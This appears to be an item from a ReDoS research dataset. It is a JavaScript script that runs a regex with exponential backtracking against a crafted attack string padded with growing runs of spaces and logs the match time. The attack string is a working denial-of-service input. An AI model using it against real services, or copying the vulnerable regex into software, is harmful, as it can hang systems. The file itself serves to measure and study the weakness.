/* 8244
 * ^.*[_A-Za-z0-9]+[\t ]+[\*&]?[\t ]*[_A-Za-z0-9](::)?[_A-Za-z0-9:]+[\t ]*\(( *[ \[\]\*&A-Za-z0-9_]+ *,? *)*\).*$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"_\t__("+" "*16+"! _1SLQ_2"
 */
var REGEX = /^.*[_A-Za-z0-9]+[\t ]+[\*&]?[\t ]*[_A-Za-z0-9](::)?[_A-Za-z0-9:]+[\t ]*\(( *[ \[\]\*&A-Za-z0-9_]+ *,? *)*\).*$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '_\t__(' + ' '.repeat(i*1) + '! _1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}